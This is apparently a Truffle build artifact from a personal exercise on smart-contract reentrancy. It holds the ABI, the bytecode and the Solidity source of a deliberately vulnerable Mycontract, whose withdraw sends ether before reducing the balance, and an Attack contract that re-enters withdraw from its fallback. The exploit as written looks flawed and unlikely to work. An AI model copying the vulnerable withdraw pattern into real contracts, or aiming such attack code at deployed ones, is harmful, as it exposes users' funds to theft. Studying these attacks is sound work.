{
  "contractName": "Mycontract",
  "abi": [
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "balances",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "deposit",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "balanceOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5061048d806100206000396000f3fe6080604052600436106100435760003560e01c806327e235e31461009b5780633ccfd60b146100d8578063722713f7146100e2578063d0e30db01461010d57610044565b5b346000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546100929190610343565b92505081905550005b3480156100a757600080fd5b506100c260048036038101906100bd91906102a9565b610117565b6040516100cf919061031d565b60405180910390f35b6100e061012f565b005b3480156100ee57600080fd5b506100f7610235565b604051610104919061031d565b60405180910390f35b61011561023d565b005b60006020528060005260406000206000915090505481565b6000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020543411610233573373ffffffffffffffffffffffffffffffffffffffff163460405161019890610308565b60006040518083038185875af1925050503d80600081146101d5576040519150601f19603f3d011682016040523d82523d6000602084013e6101da565b606091505b505050346000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825461022b9190610399565b925050819055505b565b600047905090565b346000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825461028b9190610343565b92505081905550565b6000813590506102a381610440565b92915050565b6000602082840312156102bf576102be610438565b5b60006102cd84828501610294565b91505092915050565b60006102e3600083610338565b91506102ee8261043d565b600082019050919050565b610302816103ff565b82525050565b6000610313826102d6565b9150819050919050565b600060208201905061033260008301846102f9565b92915050565b600081905092915050565b600061034e826103ff565b9150610359836103ff565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0382111561038e5761038d610409565b5b828201905092915050565b60006103a4826103ff565b91506103af836103ff565b9250828210156103c2576103c1610409565b5b828203905092915050565b60006103d8826103df565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600080fd5b50565b610449816103cd565b811461045457600080fd5b5056fea2646970667358221220a0419522b93d72dd8eba4185935bf7699fbc4284548b7b3abc256d5debf2cc6b64736f6c63430008070033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity >=0.4.0 < 0.9.0;\n\n\ncontract Mycontract{\n    \n    mapping(address =>uint) public balances;\n    \n    function deposit() external payable{\n        balances[msg.sender] += msg.value;\n    }\n    fallback() external payable{\n        balances[msg.sender] += msg.value;\n    }\n    function balanceOf() public view returns(uint){\n        return address(this).balance;\n    }\n    \n    function withdraw()payable public{\n        if(msg.value <= balances[msg.sender]){\n            payable(msg.sender).call{value:msg.value}(\"\");\n            balances[msg.sender] -= msg.value;\n        }\n        \n    }\n}\n\n contract Attack{\n    \n     Mycontract public mycontract;\n    \n     constructor(address payable _mycontract){\n         mycontract = Mycontract(_mycontract);\n     }\n    \n    //  function get() public view returns(address){\n    //      return mycontract;\n    //  }\n\n     fallback()external payable{\n         mycontract.withdraw();\n     }\n\n    function attack() external payable{\n        mycontract.withdraw();\n    }\n     function depositIn()external payable{}\n\n     function balanceOf() public view returns(uint){\n        return address(this).balance;\n    }\n    \n    function sendETH(address payable _addr)public payable{\n         (bool sent,) = _addr.call{value:msg.value}(\"\");\n         require(sent,'transaction can not be successful');\n     }\n    \n    \n }",
  "sourcePath": "/home/aduttya/Documents/smartContractAttacks/reentracy/contracts/reentracy.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.7+commit.e28d00a7.Emscripten.clang"
  },
  "schemaVersion": "3.4.3",
  "updatedAt": "2021-09-25T04:49:35.243Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}